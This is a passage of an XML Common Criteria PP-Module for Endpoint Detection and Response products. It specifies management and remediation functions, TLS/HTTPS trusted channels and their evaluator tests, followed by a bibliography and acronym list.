                      <test>In the course of performing the testing activities for the evaluation,
                        the evaluator shall use all supported interfaces, although it is not
                        necessary to repeat each test involving an administrative action with each
                        interface. The evaluator shall ensure, however, that each supported method
                        of administering the <abbr linkend="EDR"/> that conforms to the requirements
                        of this <abbr linkend="PP"/> be tested; for instance, if the <abbr
                        linkend="EDR"/> can be administered through a local hardware interface or
                        TLS/HTTPS then both methods of administration must be exercised during the
                        evaluation team’s test activities.</test>
                    </testlist>
                  </Tests>
              </aactivity>
            </f-element>
          </f-component>

          <f-component id="FMT_SMF.1(1)" name="Specification of Management Functions">
            <consistency-rationale>This SFR defines a specific set of management functions for an
              EDR. It does not impact the <cite linkend="bibAppPP"/> functionality.</consistency-rationale>
            <f-element id="FMT_SMF.1.1(1)">
              <title>The <selectables>
                  <selectable>EDR</selectable>
                  <selectable>EDR platform</selectable>
                </selectables> shall be capable of performing the following functions that control
                behavior of the Host Agent:<h:br/>
                <management-function-set default="O">
                  <manager id="a">Administrator</manager>
                  <manager id="s">SOC Analyst</manager>
                  <manager id="u">User</manager>
                  <management-function>
                    <text>Configure the time frame for sending Host Agent data to the EDR
                        <assignable>list of configurable time frames</assignable>
                    </text>
                    <M ref="a"/><O ref="s"/><_ ref="u"/>
                  </management-function>
                  <management-function>
                    <text>Assign a label or tag to categorize or group individual endpoint systems </text>
                    <M ref="a"/><O ref="s"/><_ ref="u"/>
                  </management-function>
                </management-function-set>
              </title>
              <note role="application">This requirement captures all the configuration
                functionality the <abbr linkend="TSF"/> provides the administrator to configure the
                  <abbr linkend="EDR"/> Host Agent. </note>
              <aactivity>
                <TSS>There are no TSS activities for this requirement.</TSS>
                <Guidance>The evaluator shall review the operational guidance to verify that the EDR has
                documented capabilities to perform the management functions.</Guidance>
                <Tests>The evaluator shall perform the below tests:
                 <testlist>
                   <test>The evaluator shall modify the time frame for sending Host Agent data to the EDR
                   and verify that an affected Host Agent is sending data at the intended interval.</test>
                   <test>The evaluator shall tag or categorize a group of individual endpoint systems and
                   verify that the tag or categorization persists within the EDR management dashboard for
                   other users.</test>
                 </testlist>
                </Tests>
              </aactivity>
            </f-element>
            <f-element id="FMT_SMF.1.2(1)">
              <title> The <abbr linkend="EDR"/> shall be capable of performing the following
                management functions: <h:br/>
                <management-function-set default="O">
                  <manager id="a">Administrator</manager>
                  <manager id="s">SOC Analyst</manager>
                  <manager id="u">User</manager>
                  <management-function>
                    <text>Configure the amount of time to retain collected EDR data
                        <assignable>time frame to retain data</assignable>
                    </text>
                    <M ref="a"/><O ref="s"/><_ ref="u"/>
                  </management-function>
                  <management-function>
                    <text> Obtain or display the connectivity status of a Host Agent </text>
                    <M ref="a"/><O ref="s"/><O ref="u"/>
                  </management-function>
                  <management-function>
                    <text> Configure visual suppression of incident alerts based on a configurable
                      blacklist of <selectables>
                        <selectable>filenames</selectable>
                        <selectable>folders</selectable>
                        <selectable>file hashes</selectable>
                        <selectable><assignable>other factors</assignable></selectable>
                      </selectables>
                    </text>
                    <O ref="a"/><M ref="s"/><_ ref="u"/>
                  </management-function>
                </management-function-set>
              </title>
              <note role="application"> This requirement captures all the configuration
                functionality the <abbr linkend="TSF"/> provides the administrator to configure the
                EDR. </note>
              <aactivity>
                <TSS>There are no TSS activities for this requirement.</TSS>
                <Guidance>The evaluator shall review the operational guidance to verify that the EDR has
                  documented capabilities to perform the management functions.</Guidance>
                <Tests>The evaluator shall perform the below tests:
                  <testlist>
                    <test>The evaluator shall configure the amount of time to retain collected EDR data
                    to a time frame in which existing data will be made unavailable and verify that the
                    data is no longer accessible through the EDR management dashboard.</test>
                    <test>The evaluator shall logically or physically inhibit the network communications
                    between a managed endpoint system and the EDR server and verify that the inhibited or halted
                    connectivity status of the Host Agent is recognized on the EDR management dashboard.</test>
                    <test>The evaluator shall use a file that triggers an incident alert to test the suppression
                    of such alerts for that specific file. Upon confirming the creation of incident alerts on access
                    to the file, the evaluator shall configure suppression of the alert for each available
                    suppression blacklist file or metadata characteristic and verify that incident alerts are
                    categorized as suppressed, hidden, unavailable, or never created.</test>
                  </testlist>
                </Tests>
              </aactivity>
            </f-element>
          </f-component>

          <f-component id="FMT_SRF_EXT.1" name="Specification of Remediation Functions">
            <consistency-rationale> This SFR defines a specific set of remediation functions for an
              EDR. It does not impact the <cite linkend="bibAppPP"/> functionality. </consistency-rationale>
            <f-element id="FMT_SRF_EXT.1.1">
              <title> The <abbr linkend="EDR"/> shall be capable of performing the following
                remediation functions: <h:br/>
                <management-function-set default="O">
                  <manager id="a">Administrator</manager>
                  <manager id="s">SOC Analyst</manager>
                  <manager id="u">User</manager>
                  <management-function>
                    <text> Logically quarantine an endpoint from the network </text>
                    <O ref="a"/><M ref="s"/><_ ref="u"/>
                  </management-function>
                  <management-function>
                    <text> Terminate a running process on an endpoint </text>
                    <O ref="a"/><M ref="s"/><_ ref="u"/>
                  </management-function>
                  <management-function>
                    <text> Retrieve potentially unauthorized or affected files from an endpoint </text>
                    <O ref="a"/><O ref="s"/><_ ref="u"/>
                  </management-function>
                </management-function-set>
              </title>
              <note role="application"> This requirement captures all the remediation functionality
                the <abbr linkend="EDR"/> provides the SOC Analyst and optionally the Administrator. </note>
              <aactivity>
                <TSS>There are no TSS activities for this requirement.</TSS>
                <Guidance>The evaluator shall review the operational guidance to verify that the EDR has
                  documented capabilities to perform the management functions.</Guidance>
                <Tests>The evaluator shall perform the below tests:
                  <testlist>
                    <test>The evaluator shall logically quarantine a managed endpoint system from the
                    network and verify that the system is unable to access network addresses or resources
                    outside of a whitelist.</test>
                    <test>The evaluator shall run an executable on a managed endpoint system and terminate
                    its process from the EDR management dashboard before verifying that the process is no
                    longer running on the system.</test>
                    <test>The evaluator shall place use a file that triggers and incident alert to do so
                    before retrieving the content of the file from the EDR management dashboard.</test>
                  </testlist>
                </Tests>
              </aactivity>
            </f-element>
          </f-component>

        </subsection>

        <subsection title="Trusted Path/Channels (FTP)" id="ftp">

          <!--  We may need to refine DIT_EXT.1.1
        <f-component id="ftp_dit_ext.1(2)" name="Protection of Data in Transit">
          <consistency-rationale>
            The <abbr linkend="Base-PP"/> defines FTP_DIT_EXT.1 to define the secure
            protocols used for trusted path/channel communications. This <abbr linkend="PP-Module"/>
            iterates the SFR to specify a subset of those selections for communication.
          </consistency-rationale>

          <f-element id="ftp_dit_ext.1.1(2)">
            <title><h:b>Refinement:</h:b> The application shall
              <selectables linebreak="yes">

                <selectable>encrypt all transmitted
                  <selectables>
                    <selectable>sensitive data</selectable>
                    <selectable>data</selectable>
                  </selectables> with
                  <selectables>
                    <selectable id="sel_all_https"><h:abbr title="Hypertext Transfer Protocol Secure">HTTPS</h:abbr> in accordance with FCS_HTTPS_EXT.1</selectable>
                    <selectable id="sel_all_tlsc"><h:abbr title="Transport Layer Security">TLS</h:abbr> as defined in the <h:a href="https://www.niap-ccevs.org/Profile/Info.cfm?PPID=439&amp;id=439"><h:i>TLS Package</h:i></h:a></selectable>
                    <selectable id="sel_all_dtls"><h:abbr title="Datagram Transport Layer Security">DTLS</h:abbr> as defined in the <h:a href="https://www.niap-ccevs.org/Profile/Info.cfm?PPID=439&amp;id=439"><h:i>TLS Package</h:i></h:a></selectable>
                    <selectable>SSH as conforming to the Extended Package for <h:a href="https://www.niap-ccevs.org/Profile/Info.cfm?PPID=389&amp;id=389"><h:i>Secure Shell</h:i></h:a></selectable>
                  </selectables>
                </selectable>

                <selectable>invoke platform-provided functionality to encrypt all transmitted sensitive data with
                  <selectables>
                    <selectable><h:abbr title="Hypertext Transfer Protocol Secure">HTTPS</h:abbr></selectable>
                    <selectable><h:abbr title="Transport Layer Security">TLS</h:abbr></selectable>
                    <selectable><h:abbr title="Datagram Transport Layer Security">DTLS</h:abbr></selectable>
                    <selectable>SSH</selectable>
                  </selectables>
                </selectable>

                <selectable>invoke platform-provided functionality to encrypt all transmitted data with
                  <selectables>
                    <selectable><h:abbr title="Hypertext Transfer Protocol Secure">HTTPS</h:abbr></selectable>
                    <selectable><h:abbr title="Transport Layer Security">TLS</h:abbr></selectable>
                    <selectable><h:abbr title="Datagram Transport Layer Security">DTLS</h:abbr></selectable>
                    <selectable>SSH</selectable>
                  </selectables>
                </selectable>

              </selectables>
              between itself and another trusted IT product.
            </title>
            <note role="application">
              Encryption is not required for applications transmitting data that is not sensitive.
              <h:br/>
              <h:p> If <h:i>encrypt all transmitted</h:i> is selected and <h:i>TLS</h:i> is selected, then evaluation of elements from either <linkref linkend="FCS_TLSC_EXT.1"/> or <linkref linkend="FCS_TLSS_EXT.1"/> is required.</h:p>
              <h:p> If <h:i>encrypt all transmitted</h:i> is selected and <h:i>HTTPS</h:i> is selected, <linkref linkend="FCS_HTTPS_EXT.1"/> is required.</h:p>
              <h:p> If <h:i>encrypt all transmitted</h:i> is selected and <h:i>DTLS</h:i> is selected, <linkref linkend="FCS_DTLS_EXT.1"/> is required.</h:p>
              <h:p> If <h:i>encrypt all transmitted</h:i> is selected and <h:i>SSH</h:i> is selected, the TSF shall be validated against the <h:i>Extended Package for <h:a href="https://www.niap-ccevs.org/Profile/Info.cfm?PPID=389&amp;id=389">Secure Shell</h:a></h:i>.</h:p>
              <h:p>
                If <h:i>encrypt all transmitted</h:i> is selected the corresponding FCS_COP.1 requirements will be included.
              </h:p>
            </note>
            <aactivity>

            </aactivity>
          </f-element>
        </f-component>
        -->

          <f-component id="FTP_TRP.1(2)" name="Trusted Path (for Remote Administration)">
            <consistency-rationale>This SFR defines a specific set of functions for secure remote
              administration of the EDR. It does not impact <cite linkend="bibAppPP"/> functionality.</consistency-rationale>
            <f-element id="FTP_TRP.1.1(2)">
              <title><h:b>Refinement:</h:b> The <selectables>
                  <selectable>EDR</selectable>
                  <selectable><abbr linkend="EDR"/> platform</selectable>
                </selectables> shall use <selectables>
                  <selectable id="FTP_TLS_2">TLS</selectable>
                  <selectable id="FTP_HTTPS_2">HTTPS</selectable>
                </selectables> to provide a trusted communication path between itself and remote
                administrators that is logically distinct from other communication paths and
                provides assured identification of its endpoints and protection of the communicated
                data from modification and disclosure.</title>
            </f-element>
            <f-element id="FTP_TRP.1.2(2)">
              <title><h:b>Refinement:</h:b> The <selectables>
                  <selectable>EDR</selectable>
                  <selectable><abbr linkend="EDR"/> platform</selectable>
                </selectables> shall permit remote administrators to initiate communication via the
                trusted path.</title>
            </f-element>
            <f-element id="FTP_TRP.1.3(2)">
              <title><h:b>Refinement:</h:b> The <selectables>
                  <selectable>EDR</selectable>
                  <selectable><abbr linkend="EDR"/> platform</selectable>
                </selectables> shall require the use of the trusted path for all remote
                administration actions.</title>
              <note role="application">This requirement ensures that authorized remote
                administrators initiate all communication with the <abbr linkend="EDR"/> via a
                trusted path, and that all communications with the <abbr linkend="EDR"/> by remote
                administrators is performed over this path. The data passed in this trusted
                communication channel are encrypted as defined the protocol chosen in the first
                selection. The <abbr linkend="ST"/> author chooses the mechanism or mechanisms
                supported by the <abbr linkend="EDR"/>. </note>
              <aactivity>

                <TSS> The evaluator shall examine the <abbr linkend="TSS"/> to determine that the
                  methods of remote <abbr linkend="TOE"/> administration are indicated, along with
                  how those communications are protected. The evaluator shall also confirm that all
                  protocols listed in the <abbr linkend="TSS"/> in support of <abbr linkend="TOE"/>
                  administration are consistent with those specified in the requirement, and are
                  included in the requirements in the <abbr linkend="ST"/>. </TSS>
                <Guidance> The evaluator shall confirm that the operational guidance contains
                  instructions for establishing the remote administrative sessions for each
                  supported method. <Tests>
                    <testlist>
                      <test> The evaluators shall ensure that communications using each specified
                        (in the operational guidance) remote administration method is tested during
                        the course of the evaluation, setting up the connections as described in the
                        operational guidance and ensuring that communication is successful </test>
                      <test> For each method of remote administration supported, the evaluator shall
                        follow the operational guidance to ensure that there is no available
                        interface that can be used by a remote user to establish remote
                        administrative sessions without invoking the trusted path. </test>
                      <test> The evaluator shall ensure, for each method of remote administration,
                        the channel data is not sent in plaintext. </test>
                    </testlist>
                  </Tests>
                </Guidance>
              </aactivity>
            </f-element>
          </f-component>

          <f-component id="FTP_ITC.1" name="Trusted Channel (Host Agent)">
            <consistency-rationale> This SFR defines a specific set of functions for secure
              communication with a Host Agent. It does not impact the <cite linkend="bibAppPP"/> functionality. </consistency-rationale>
            <f-element id="FTP_ITC.1.1">
              <title>The <selectables>
                  <selectable>EDR</selectable>
                  <selectable><abbr linkend="EDR"/> platform</selectable>
                </selectables> shall use <selectables>
                  <selectable id="ITC_TLS_2">TLS</selectable>
                  <selectable id="ITC_HTTPS_2">HTTPS</selectable>
                </selectables> to provide a trusted communication channel between itself and another
                trusted IT product that is logically distinct from other communication channels,
                provides assured identification of its end points, protects channel data from
                disclosure, and detects modification of the channel data. </title>
              <note role="application"> The intent of the above requirement is to use the
                cryptographic protocols identified in the requirement to establish and maintain a
                trusted channel between the <abbr linkend="EDR"/> and the Host Agent. Only TLS, or
                HTTPS can be used in this trusted channel. <h:br/><h:br/> This requirement is to
                ensure that the transmission of any logs, process lists, system information, etc,
                when commanded, or at configurable intervals, is properly protected. This trusted
                channel also protects any commands and policies sent by the <abbr linkend="EDR"/> to
                the Host Agent. Either the Host Agent or the <abbr linkend="EDR"/> System is able to
                initiate the connection. <h:br/><h:br/> This trusted channel protects both the
                connection between an enrolled Host Agent and the <abbr linkend="EDR"/> and the
                connection between an unenrolled Host Agent and the <abbr linkend="EDR"/> during the
                enrollment operation. Different protocols can be used for these two connections, and
                the description in the <abbr linkend="TSS"/> should make this difference clear.
                <h:br/><h:br/> The trusted channel uses TLS, or HTTPS as the protocol that preserves
                the confidentiality and integrity of <abbr linkend="EDR"/> communications. The <abbr
                  linkend="ST"/> author chooses the mechanism or mechanisms supported by the <abbr
                  linkend="EDR"/>, and then ensures the correct requirements are included the <abbr
                  linkend="ST"/> if not already present. Protocol, RBG, Certificate validation,
                algorithm, and similar services may be met with platform provided services. </note>
            </f-element>
            <f-element id="FTP_ITC.1.2">
              <title>The <selectables>
                  <selectable>EDR</selectable>
                  <selectable><abbr linkend="EDR"/> platform</selectable>
                </selectables> shall permit the <abbr linkend="EDR"/> and Host Agent to initiate
                communication via the trusted channel. </title>
            </f-element>
            <f-element id="FTP_ITC.1.3">
              <title>The <selectables>
                  <selectable>EDR</selectable>
                  <selectable><abbr linkend="EDR"/> platform</selectable>
                </selectables> shall initiate communication via the trusted channel for all
                communication between the <abbr linkend="EDR"/> and the Host Agent. </title>
              <aactivity>

                <TSS> The evaluator shall examine the <abbr linkend="TSS"/> to determine that the
                  methods of Agent-Server communication are indicated, along with how those
                  communications are protected. The evaluator shall also confirm that all protocols
                  listed in the <abbr linkend="TSS"/> in support of remote <abbr linkend="TOE"/>
                  administration are consistent with those specified in the requirement, and are
                  included in the requirements in the <abbr linkend="ST"/>. </TSS>
                <Guidance> The evaluator shall confirm that the operational guidance contains
                  instructions for configuring the communication channel between the Host Agent and
                  the <abbr linkend="EDR"/> for each supported method. <Tests>
                    <testlist>
                      <test> The evaluators shall ensure that communications using each specified
                        (in the operational guidance) Agent-Server communication method is tested
                        during the course of the evaluation, setting up the connections as described
                        in the operational guidance and ensuring that communication is successful. </test>
                      <test> The evaluator shall ensure, for each method of Agent-Server
                        communication, the channel data is not sent in plaintext. </test>
                    </testlist>
                  </Tests>
                </Guidance>
              </aactivity>
            </f-element>
          </f-component>

        </subsection>
    </man-sfrs>

    <opt-sfrs/>

    <sel-sfrs> </sel-sfrs>

    <obj-sfrs>
      <subsection title="Security Management (FMT)" id="fmt">

        <f-component id="FMT_TRM_EXT.1" name="Trusted Remediation Functions">
          <consistency-rationale>This SFR defines protections for the integrity of commands sent to
            the Host Agent. It does not impact the <cite linkend="bibAppPP"/> functionality. </consistency-rationale>
          <f-element id="FMT_TRM_EXT.1.1">
            <title>The <abbr linkend="EDR"/> shall digitally signed commands or policies sent to the
              Host Agent. </title>
            <note role="application">The intent of this requirement is to cryptographically tie a
              command sent to a Host Agent to the enterprise that mandated the command, not to
              protect the commands in transit (as they are already protected by <linkref
                linkend="FTP_ITC.1"/>). </note>
            <aactivity>
              <TSS></TSS>
              <Guidance>The evaluator shall review the operational guidance and ensure that the
                <abbr linkend="EDR"/> implements all documented forms of remediation.
              </Guidance>
              <Tests>The evaluator shall select any one remediation function documented in the
                administrative guide (e.g., terminate process), and execute that command
                while capturing traffic. The evaluator shall review captured network traffic and
                verify that a digital signature was sent along with the coinciding command or policy update.
                The <abbr linkend="EDR"/> may need to be configured in a manner to disable transport
                encryption for this test or the network capture tool may need to be
                configured with the private key such that decrypted traffic can be made
                available to the evaluator.
              </Tests>
            </aactivity>
          </f-element>
        </f-component>
      </subsection>
    </obj-sfrs>

  </chapter>

  <bibliography>
    <cc-entry/>
    <entry id="bibAppPP">
      <tag>AppPP</tag>
      <description>
        <h:a href="https://www.niap-ccevs.org/pp/PP_APP_v1.3/">Protection Profile for Application
          Software</h:a>
      </description>
    </entry>
    <entry id="bibHAGT">
      <tag>Host Agent</tag>
      <description>
        <h:a href="https://commoncriteria.github.io/pp/esm-hostagent/esm-hostagent-release.html"
          >Module for ESM Host Agent, Version 1.0, July 2019</h:a>
      </description>
    </entry>
    <entry id="bibCC">
      <tag>CC</tag>
      <description>Common Criteria for Information Technology Security Evaluation - <h:ul>
          <h:li><h:a href="http://www.commoncriteriaportal.org/files/ccfiles/CCPART1V3.1R5.pdf">Part
              1: Introduction and General Model</h:a>, CCMB-2012-09-001, Version 3.1 Revision 5,
            September 2012.</h:li>
          <h:li><h:a href="http://www.commoncriteriaportal.org/files/ccfiles/CCPART2V3.1R5.pdf">Part
              2: Security Functional Components</h:a>, CCMB-2012-09-002, Version 3.1 Revision 5,
            September 2012.</h:li>
          <h:li><h:a href="http://www.commoncriteriaportal.org/files/ccfiles/CCPART3V3.1R5.pdf">Part
              3: Security Assurance Components</h:a>, CCMB-2012-09-003, Version 3.1 Revision 5,
            September 2012.</h:li>
        </h:ul></description>
    </entry>
  </bibliography>

  <acronyms>
    <entry>
      <term>AES</term>
      <description>Advanced Encryption Standard</description>
    </entry>
    <entry>
      <term>ANSI</term>
      <description>American National Standards Institute</description>
    </entry>
    <entry>
      <term>API</term>
      <description>Application Programming Interface</description>
    </entry>
    <entry>
      <term>ASLR</term>
      <description>Address Space Layout Randomization</description>
    </entry>
    <entry>
      <term>CESG</term>
      <description>Communications-Electronics Security Group</description>
    </entry>
    <entry>
      <term>CMC</term>
      <description>Certificate Management over CMS</description>
    </entry>
    <entry>
      <term>CMS</term>
      <description>Cryptographic Message Syntax</description>
    </entry>
    <entry>
      <term>CN</term>
      <description>Common Names</description>
    </entry>
    <entry>
      <term>CRL</term>
      <description>Certificate Revocation List</description>
    </entry>
    <entry>
      <term>CSA</term>
      <description>Computer Security Act</description>
    </entry>
    <entry>
      <term>DEP</term>
      <description>Data Execution Prevention</description>
    </entry>
    <entry>
      <term>DES</term>
      <description>Data Encryption Standard</description>
    </entry>
    <entry>
      <term>DHE</term>
      <description>Diffie-Hellman Ephemeral</description>
    </entry>
    <entry>
      <term>DNS</term>
      <description>Domain Name System</description>
    </entry>
    <entry>
      <term>DRBG</term>
      <description>Deterministic Random Bit Generator</description>
    </entry>
    <entry>
      <term>DSS</term>
      <description>Digital Signature Standard</description>
    </entry>
    <entry>
      <term>DT</term>
      <description>Date/Time Vector</description>
    </entry>
    <entry>
      <term>DTLS</term>
      <description>Datagram Transport Layer Security</description>
    </entry>
    <entry>
      <term>EAP</term>
      <description>Extensible Authentication Protocol</description>
    </entry>
    <entry>
      <term>ECDHE</term>
      <description>Elliptic Curve Diffie-Hellman Ephemeral</description>
    </entry>
    <entry>
      <term>ECDSA</term>
      <description>Elliptic Curve Digital Signature Algorithm</description>
    </entry>
    <entry>
      <term>EDR</term>
      <description>Endpoint Detection and Response</description>
    </entry>
    <entry>
      <term>EST</term>
      <description>Enrollment over Secure Transport</description>
    </entry>
    <entry>
      <term>FIPS</term>
      <description>Federal Information Processing Standards</description>
    </entry>
    <entry>
      <term>DSS</term>
      <description>Digital Signature Standard</description>
    </entry>
    <entry>
      <term>HMAC</term>
      <description>Hash-based Message Authentication Code</description>
    </entry>
    <entry>
      <term>HTTP</term>
      <description>Hypertext Transfer Protocol</description>
    </entry>
    <entry>
      <term>HTTPS</term>
      <description>Hypertext Transfer Protocol Secure</description>
    </entry>
    <entry>
      <term>DSS</term>
      <description>Digital Signature Standard</description>
    </entry>
    <entry>
      <term>IETF</term>
      <description>Internet Engineering Task Force</description>
    </entry>
    <entry>
      <term>IP</term>
      <description>Internet Protocol</description>
    </entry>
    <entry>
      <term>ISO</term>
      <description>International Organization for Standardization</description>
    </entry>
    <entry>
      <term>IT</term>
      <description>Information Technology</description>
    </entry>
    <entry>
      <term>ITSEF</term>
      <description>Information Technology Security Evaluation Facility</description>
    </entry>
    <entry>
      <term>NFC</term>
      <description>Near Field Communication</description>
    </entry>
    <entry>
      <term>NIAP</term>
      <description>National Information Assurance Partnership</description>
    </entry>
    <entry>
      <term>NIST</term>
      <description>National Institute of Standards and Technology</description>
    </entry>
    <entry>
      <term>OCSP</term>
      <description>Online Certificate Status Protocol</description>
    </entry>
    <entry>
      <term>OID</term>
      <description>Object Identifier</description>
    </entry>
    <entry>
      <term>OMB</term>
      <description>Office of Management and Budget</description>
    </entry>
    <entry>
      <term>OS</term>
      <description>Operating System</description>
    </entry>
    <entry>
      <term>PII</term>
      <description>Personally Identifiable Information</description>
    </entry>
    <entry>
      <term>PKI</term>
      <description>Public Key Infrastructure</description>
    </entry>
    <entry>
      <term>PP</term>
      <description>Protection Profile</description>
    </entry>
    <entry>
      <term>RBG</term>
      <description>Random Bit Generator</description>
    </entry>
    <entry>
      <term>RFC</term>
      <description>Request for Comment</description>
    </entry>
    <entry>
      <term>RNG</term>
      <description>Random Number Generator</description>
    </entry>
    <entry>
      <term>RNGVS</term>
      <description>Random Number Generator Validation System</description>
    </entry>
    <entry>
      <term>SAN</term>
      <description>Subject Alternative Name</description>
    </entry>
    <entry>
      <term>SAR</term>
      <description>Security Assurance Requirement</description>
    </entry>
    <entry>
      <term>SFR</term>
      <description>Security Functional Requirement</description>
    </entry>
    <entry>
      <term>SHA</term>
      <description>Secure Hash Algorithm</description>
    </entry>
    <entry>
      <term>S/MIME</term>
      <description>Secure/Multi-purpose Internet Mail Extensions</description>
    </entry>
    <entry>
      <term>SIP</term>
      <description>Session Initiation Protocol</description>
    </entry>
    <entry>
      <term>SWID</term>
      <description>Software Identification</description>
    </entry>
    <entry>
      <term>TLS</term>
      <description>Transport Layer Security</description>
    </entry>
    <entry>
      <term>URI</term>
      <description>Uniform Resource Identifier</description>
    </entry>
    <entry>
      <term>URL</term>
      <description>Uniform Resource Locator</description>
    </entry>
    <entry>
      <term>USB</term>
      <description>Universal Serial Bus</description>
    </entry>
    <entry>
      <term>XCCDF</term>
      <description>eXtensible Configuration Checklist Description Format</description>
    </entry>
    <entry>
      <term>XOR</term>
      <description>Exclusive Or</description>
    </entry>
  </acronyms>

</Module>
